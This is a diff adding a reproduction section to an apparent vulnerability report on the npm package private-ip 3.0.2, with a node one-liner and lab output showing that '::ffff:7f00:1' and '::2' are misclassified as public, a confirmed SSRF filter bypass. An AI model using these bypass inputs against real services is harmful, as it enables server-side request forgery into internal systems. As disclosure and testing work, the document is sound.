@@ -38,4 +38,49 @@ Any caller passing a user-controlled IPv6 string to `private-ip` — including S
 
 ---
 
+---
+
+## Reproduction (validated 2026-06-19)
+
+**Lab reference:** `targets/labs/npm-private-ip/`
+
+**Pinned version:** private-ip 3.0.2
+
+### Steps
+
+1. **Install the package:**
+   ```bash
+   npm install private-ip@3.0.2
+   ```
+
+2. **Run the IPv6 bypass test:**
+   ```bash
+   node -e "
+   const p = require('private-ip');
+   console.log('::ffff:7f00:1 =>', p('::ffff:7f00:1'));  // expected: true, got: false
+   console.log('::2 =>', p('::2'));                        // expected: true, got: false
+   "
+   ```
+
+3. **Verify** that private/loopback IPs are misclassified as public (SSRF bypass).
+
+### Observed output (from `targets/labs/npm-private-ip/results.txt`)
+
+```
+private-ip PoC -- version: 3.0.2
+
+ip                                      got     expected  verdict
+------------------------------------------------------------------------
+::ffff:7f00:1                           false   true      BYPASS
+::2                                     false   true      BYPASS
+
+=== RESULT: 2 bypass(es) -- private IP treated as public ===
+```
+
+### Verdict
+
+**CONFIRMED.** Two IPv6 representations bypass the filter: `::ffff:7f00:1` (hex-form IPv4-mapped loopback) and `::2` (deprecated unicast). SSRF protections relying on this package can be bypassed.
+
+---
+
 **Pipeline:** 2 raw findings → 1 confirmed (1 HIGH breachable)
